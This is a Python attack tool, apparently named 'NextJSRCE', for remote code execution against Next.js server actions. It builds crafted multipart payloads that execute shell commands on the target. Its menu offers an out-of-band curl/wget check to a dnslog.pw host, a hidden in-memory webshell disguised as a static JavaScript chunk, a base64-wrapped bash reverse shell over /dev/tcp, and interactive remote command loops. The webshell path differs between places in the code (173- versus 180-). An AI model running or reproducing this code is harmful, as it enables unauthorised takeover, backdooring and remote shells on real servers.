import requests
import urllib3
import base64
import time
import sys
import os
from colorama import init, Fore


urllib3.disable_warnings()
init()


def banner():
    banner_text = """
  _   _           _      _ ____  ____   ____ _____ 
 | \ | | _____  _| |_   | / ___||  _ \ / ___| ____|
 |  \| |/ _ \ \/ / __|  | \___ \| |_) | |   |  _|  
 | |\  |  __/>  <| || |_| |___) |  _ <| |___| |___ 
 |_| \_|\___/_/\_\\\\__\___/|____/|_| \_\\\\____|_____|                                           
    """
    print(Fore.CYAN + banner_text)


def menu():
    menu_text = """
[1] DNSLog
[2] WebShell
[3] Reverse shell
[4] Exec command(normal)
[5] Exec command(base64)
[6] Exec command(webshell)
    """
    print(Fore.CYAN + menu_text)


def file_to_list(filename):
    res_list = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f.readlines():
            if line.strip() not in res_list:
                res_list.append(line.strip())
    return res_list


def handle_target(target):
    if "http:" not in str(target) and "https" not in str(target):
        target = f'http://{target}'
    return target.rstrip('/')


def logger(filename, string, io_type):
    with open(filename, io_type, encoding="utf-8") as f:
        f.write(string)


def gen_cmd_payload(cmd):
    payload = """------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').exec('Thisisthepayload');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"""
    return payload.replace('Thisisthepayload', cmd)


def gen_webshell_payload():
    payload = """------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/_next/static/chunks/173-19c5dae138f93b4a.js'){const cmd=parsedUrl.query.version||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"""
    return payload


def check_webshell(target):
    target_part = target.split('/')
    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/180-19c5138f93b4a.js'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Origin': f'{target}',
        'Referer': f'{target}'
    }
    try:
        res = requests.get(url=shell_url, headers=header, verify=False, timeout=5)
        cmd_res = res.json()['stdout']
    except Exception as e:
        return False
    else:
        if res.status_code == 200 and cmd_res!= "":
            return True
        else:
            return False


def get_dns_log_res(timestamp):
    api_url = f'http://dnslog.pw/api/dns/dnslogtest135/{timestamp}/?token=ba23e9c3'
    try:
        res = requests.get(url=api_url, verify=False, timeout=5)
    except Exception as e:
        return False
    else:
        return res.text


def run_cmd(target, cmd):
    target_url = f'{target}'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Origin': f'{target}',
        'Referer': f'{target}',
        'Next-Action': 'x',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
        'X-Nextjs-Request-Id': 'b5dce965',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
    }
    data = gen_cmd_payload(cmd=cmd).lstrip('\n').rstrip('\n')
    try:
        requests.post(url=target_url, data=data, headers=header, verify=False, timeout=5)
    except Exception as e:
        print(Fore.GREEN + '[+] Payload send success!')


def get_webshell(target):
    target_url = f'{target}'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Origin': f'{target}',
        'Referer': f'{target}',
        'Next-Action': 'x',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
        'X-Nextjs-Request-Id': 'b5dce965',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
    }
    data = gen_webshell_payload()
    try:
        requests.post(url=target_url, data=data, headers=header, verify=False, timeout=5)
    except Exception as e:
        print(Fore.GREEN + '[+] Payload send success!')


def get_webshell_main(target):
    target_part = str(target).split('/')
    target = f'{target_part[0]}//{target_part[2]}'
    if not check_webshell(target=target):
        get_webshell(target=target)
        if check_webshell(target=target):
            print(Fore.GREEN + '[*] Shell inject success!')
            print(Fore.GREEN + f'[*] {target}/_next/static/chunks/180-19c5138f93b4a.js?version=whoami')
            logger(filename='results.txt', io_type='a', string=f'[shell] {target}/_next/static/chunks/180-19c5138f93b4a.js?version=whoami\n\n')
        else:
            print(Fore.RED + '[-] Shell inject failed!')
    else:
        print(Fore.WHITE + '[+] Shell already exist!')
        print(Fore.WHITE + f'[*] {target}/_next/static/chunks/173-19c5138f93b4a.js?version=whoami')



def check_dns_log(target, dnslog):
    if dnslog == "":
        timestamp = time.time()
        print(Fore.WHITE + '[+] Dnslog is empty, use default value: ' + Fore.GREEN + f'{timestamp}.dnslogtest135.dnslog.pw')
        run_cmd(target=target, cmd=f'curl {timestamp}.dnslogtest135.dnslog.pw || wget {timestamp}.dnslogtest135.dnslog.pw')
        if get_dns_log_res(timestamp=timestamp) == 'True':
            print(Fore.GREEN + '[*] Dnslog verification passed!')
            logger(filename='results.txt', io_type='a', string=f'[dnslog] {target}\n\n')
        else:
            print(Fore.RED + '[-] Dnslog verification failed!')
    else:
        run_cmd(target=target, cmd=f'curl {dnslog} || wget {dnslog}')
        print(Fore.WHITE + '[+] The payload is sent successfully, please check it yourself.')


def reverse_shell(target, host, port):
    bash_cmd = f'/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1'
    bash_cmd_b64 = base64.b64encode(bash_cmd.encode('utf-8')).decode('utf-8')
    cmd = 'bash -c \\"{echo,Thisiscmd}|{base64,-d}|{bash,-i}\\"'.replace('Thisiscmd', bash_cmd_b64)
    run_cmd(target=target, cmd=cmd)


def exec_cmd_base64(target, cmd):
    cmd_b64 = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    cmd = 'bash -c \\"{echo,Thisiscmd}|{base64,-d}|{bash,-i}\\"'.replace('Thisiscmd', cmd_b64)
    run_cmd(target=target, cmd=cmd)


def exec_cmd_shell(target, cmd):
    target_part = target.split('/')
    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/180-19c5138f93b4a.js?version={cmd}'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Origin': f'{target}',
        'Referer': f'{target}'
    }
    try:
        res = requests.get(url=shell_url, headers=header, verify=False, timeout=5)
        cmd_res = res.json()['stdout']
    except Exception as e:
        return 'Payload send failed!'
    else:
        return cmd_res




def run():
    os.system('cls' if os.name == 'nt' else 'clear')
    target = ''
    while True:
        banner()
        menu()
        if target == "":
            target = input(Fore.WHITE + '[+] Target url:')
        else:
            target = input(Fore.WHITE + f'[+] Target url(Now:{target}/):') or target
        if target in ['exit', 'q', 'quit', 'Exit', 'Q', 'Quit']:
            sys.exit()
        elif target in ['1', '2', '3', '4', '5', '6']:
            os.system('cls' if os.name == 'nt' else 'clear')
            target = ''
            continue
        target = handle_target(target=target)
        choice = input(Fore.WHITE + '[+] Option:')
        target_part = target.split('/')
        if choice == '1':
            dns_log = input(Fore.WHITE + '[+] Dnslog address:')
            check_dns_log(target=handle_target(target=target), dnslog=dns_log)
            input(Fore.WHITE + 'Enter......')
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '2':
            get_webshell_main(target=handle_target(target=target))
            input(Fore.WHITE + 'Enter......')
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '3':
            reverse_host = input(Fore.WHITE + '[+] Reverse host:')
            reverse_port = input(Fore.WHITE + '[+] Reverse port:')
            reverse_shell(target=handle_target(target=target), host=reverse_host, port=reverse_port)
            input(Fore.WHITE + 'Enter......')
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '4':
            while True:
                command = input(Fore.BLUE + f'{target_part[2]}@shell:# ')
                if command in ['exit', 'q', 'quit', 'Exit', 'Q', 'Quit']:
                    sys.exit()
                elif command in ['b', 'B', 'back', 'Back']:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break
                else:
                    run_cmd(target=handle_target(target), cmd=command)
        elif choice == '5':
            while True:
                command = input(Fore.BLUE + f'{target_part[2]}@shell:# ')
                if command in ['exit', 'q', 'quit', 'Exit', 'Q', 'Quit']:
                    sys.exit()
                elif command in ['b', 'B', 'back', 'Back']:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break
                else:
                    exec_cmd_base64(target=handle_target(target), cmd=command)
        elif choice == '6':
            while True:
                command = input(Fore.BLUE + f'{target_part[2]}@shell:# ')
                if command in ['exit', 'q', 'quit', 'Exit', 'Q', 'Quit']:
                    sys.exit()
                elif command in ['b', 'B', 'back', 'Back']:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break
                else:
                    print(Fore.WHITE + exec_cmd_shell(target=handle_target(target), cmd=command).rstrip('\n'))
        elif choice in ['exit', 'q', 'quit', 'Exit', 'Q', 'Quit']:
            sys.exit()
        else:
            print(Fore.RED + '[-] Unknown choice!')
            os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == '__main__':
    run()
